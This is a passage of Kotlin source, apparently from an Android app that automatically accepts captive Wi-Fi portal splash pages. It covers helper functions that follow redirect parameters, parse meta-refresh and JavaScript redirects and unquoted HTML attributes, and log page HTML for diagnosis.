     * approval endpoint in its own URL as ?redirecturl=http://<nas-ip>/reg.php with sibling params
     * (network/apMac/clientMac). The Accept anchor's href is JS-filled to navigate there. We replicate
     * the click by GETting <redirecturl>?<sibling-params> (and the bare <redirecturl> as a fallback).
     * Returns true if the network clears. No-op (false) when the page URL has no redirecturl param.
     */
    private fun tryRedirecturlAccept(net: Network, pageUrl: String): Boolean {
        val query = try { URL(pageUrl).query } catch (_: Throwable) { null } ?: return false
        val pairs = query.split("&").mapNotNull {
            val i = it.indexOf('='); if (i <= 0) null else it.substring(0, i) to it.substring(i + 1)
        }
        val redirRaw = pairs.firstOrNull { it.first.equals("redirecturl", true) }?.second ?: return false
        val target = try { java.net.URLDecoder.decode(redirRaw, "UTF-8") } catch (_: Throwable) { redirRaw }
        if (!target.startsWith("http")) return false
        val rest = pairs.filter { !it.first.equals("redirecturl", true) }.joinToString("&") { "${it.first}=${it.second}" }
        val sep = if (target.contains('?')) '&' else '?'
        val candidates = if (rest.isNotEmpty()) listOf("$target$sep$rest", target) else listOf(target)
        for (c in candidates) {
            Log.i(TAG, "redirecturl accept → ${c.take(200)}")
            try {
                if (c.startsWith("http://")) {
                    val r = rawHttp(net, "GET", c)
                    if (r != null && r.first in 300..399 && !r.second.isNullOrBlank()) fetchPage(net, resolve(c, r.second!!))
                } else {
                    val cc = open(net, c, true); cc.responseCode; captureCookies(cc); cc.disconnect()
                }
            } catch (t: Throwable) { Log.i(TAG, "redirecturl accept failed: ${t.message}") }
            repeat(3) { if (isClear(net)) { Log.i(TAG, "redirecturl accept cleared via ${c.take(80)}"); return true }; Thread.sleep(1500) }
        }
        return false
    }

    private fun baseHref(html: String): String? =
        Regex("(?is)<base\\b[^>]*href\\s*=\\s*[\"']([^\"']+)[\"']").find(html)?.groupValues?.get(1)

    /**
     * Pull a redirect target out of a form-less "bounce" page: a <meta http-equiv=refresh>, or a JS
     * assignment to (window|document|self|top).location[.href] / location.replace("…"). Resolved
     * absolute against [base]. Covers the SonicWall <title>REDIR</title> redirTimer() page.
     */
    private fun extractRedirect(html: String, base: String): String? {
        Regex("(?is)<meta[^>]+http-equiv\\s*=\\s*[\"']?refresh[\"']?[^>]+content\\s*=\\s*[\"']([^\"']+)[\"']")
            .find(html)?.groupValues?.get(1)?.let { content ->
                Regex("(?i)\\burl\\s*=\\s*(.+)$").find(content.trim())?.groupValues?.get(1)
                    ?.trim()?.trim('\'', '"')?.takeIf { it.isNotBlank() }?.let { return resolve(base, it) }
            }
        Regex("(?is)\\blocation\\s*\\.\\s*replace\\s*\\(\\s*[\"']([^\"']+)[\"']")
            .find(html)?.groupValues?.get(1)?.takeIf { it.isNotBlank() }?.let { return resolve(base, it) }
        Regex("(?is)\\blocation(?:\\s*\\.\\s*href)?\\s*=\\s*[\"']([^\"']+)[\"']")
            .find(html)?.groupValues?.get(1)?.takeIf { it.isNotBlank() }?.let { return resolve(base, it) }
        // JS variable holding the redirect URL — redirURL='https://…' (ExtremeCloud IQ / Aerohive),
        // redirectUrl="…", etc. The bounce page later does window.location=<var>, so the literal isn't
        // on a location= line. The https?:// anchor makes this skip redirTime='500' and grab the URL.
        Regex("(?is)\\b\\w*(?:redir|url)\\w*\\s*=\\s*[\"'](https?://[^\"']+)[\"']")
            .find(html)?.groupValues?.get(1)?.replace("&amp;", "&")?.takeIf { it.isNotBlank() }?.let { return resolve(base, it) }
        return null
    }

    // SonicWall (and other CGI-generated) portals emit UNQUOTED HTML attributes —
    // <input type=hidden name=sessId value=12345>. A quotes-only regex silently drops every such
    // field, so the accept POST goes out with an empty body and the portal rejects it. Match a
    // double-quoted, single-quoted, OR bare token.
    private fun attr(tag: String, name: String): String? {
        val m = Regex("(?i)\\b$name\\s*=\\s*(?:\"([^\"]*)\"|'([^']*)'|([^\\s\"'>]+))").find(tag) ?: return null
        return when {
            m.groupValues[1].isNotEmpty() -> m.groupValues[1]
            m.groupValues[2].isNotEmpty() -> m.groupValues[2]
            m.groupValues[3].isNotEmpty() -> m.groupValues[3]
            else -> ""   // matched an empty quoted value (value="") — attribute present, value empty
        }
    }

    private fun appendQuery(url: String, params: String): String {
        if (params.isEmpty()) return url
        val sep = if (url.contains('?')) '&' else '?'
        return "$url$sep$params"
    }

    // DIAGNOSTIC: dump a page's HTML to logcat in chunks (logcat truncates long lines), de-duped by
    // content hash so a cycling attempt doesn't spam. Used to reverse-engineer JS-driven splash pages.
    @Volatile private var lastDumpHash = 0
    private fun dumpHtml(html: String) {
        val h = html.hashCode()
        if (h == lastDumpHash) return
        lastDumpHash = h
        val clean = html.replace(Regex("\\s+"), " ")
        var i = 0; var idx = 0
        while (i < clean.length && i < 2000) {   // head only — the bulk is Terms/Privacy text
            val end = minOf(i + 700, clean.length)
            Log.i(TAG, "html[$idx] ${clean.substring(i, end)}")
            i = end; idx++
        }
        Log.i(TAG, "html-len=${html.length}")
        // Targeted: the Accept anchor(s) + the inline JS that fills their (empty) href.
        Regex("(?is)<a\\b[^>]*>.*?</a>").findAll(html)
            .filter { ACCEPT_KW.containsMatchIn(it.value) }
            .take(3).forEach { Log.i(TAG, "accept-anchor: ${it.value.replace(Regex("\\s+"), " ").take(400)}") }
        Regex("(?is)<script\\b[^>]*\\bsrc\\s*=\\s*[\"']([^\"']+)[\"']").findAll(html)
            .take(8).forEach { Log.i(TAG, "script-src: ${it.groupValues[1]}") }
        Regex("(?is)<script\\b(?![^>]*\\bsrc)[^>]*>(.*?)</script>").findAll(html)
            .map { it.groupValues[1].replace(Regex("\\s+"), " ").trim() }.filter { it.isNotEmpty() }
            .take(4).forEachIndexed { n, js -> Log.i(TAG, "script[$n] ${js.take(700)}") }
    }

    private fun resolve(base: String, ref: String): String = try { URL(URL(base), ref).toString() } catch (_: Throwable) { ref }
    private fun enc(s: String): String = URLEncoder.encode(s, "UTF-8")
}
